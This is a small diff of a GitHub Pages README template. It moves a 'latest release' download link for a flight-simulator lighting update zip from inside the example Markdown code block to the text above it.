@@ -8,6 +8,8 @@ Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://j
 
 Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
+[latest release] (https://github.com/Uwajimaya/FS2020/raw/2062ff8823843d0cc3085f4d61c23b125d46754b/TMB930%20Lighting%20update.zip).
+
 ```markdown
 Syntax highlighted code block
 
@@ -22,7 +24,7 @@ Syntax highlighted code block
 2. List
 
 **Bold** and _Italic_ and `Code` text
-[latest release] (https://github.com/Uwajimaya/FS2020/raw/2062ff8823843d0cc3085f4d61c23b125d46754b/TMB930%20Lighting%20update.zip).
+
 
 [Link]() and ![Image](src)
 ```
